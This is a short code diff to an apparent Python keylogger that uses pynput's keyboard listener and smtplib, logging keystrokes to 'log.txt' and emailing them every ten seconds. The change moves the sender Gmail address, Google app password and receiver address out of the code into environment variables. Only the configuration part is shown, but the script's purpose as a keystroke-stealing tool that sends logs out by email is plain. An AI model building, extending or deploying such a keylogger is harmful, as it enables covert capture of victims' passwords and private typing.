@@ -2,10 +2,16 @@ import smtplib
 import time
 import os
 from pynput.keyboard import Listener
+from dotenv import load_dotenv
 
-from_address = "xxxxxxx@gmail.com"
-from_address_password = "xxxx xxxx xxxx xxxx" # Password for the email account (google app password)
-to_list = ["xxxxxxx@gmail.com"]
+load_dotenv()
+SENDER_EMAIL = os.getenv("SENDER_EMAIL")
+GOOGLE_PASSWORD = os.getenv("GOOGLE_PASSWORD")
+RECEIVER_EMAIL = os.getenv("RECEIVER_EMAIL")
+
+from_address = SENDER_EMAIL 
+from_address_password = GOOGLE_PASSWORD # Password for the email account (use google app password)
+to_list = [RECEIVER_EMAIL] 
 log_file = "log.txt"
 send_interval = 10  # seconds
 
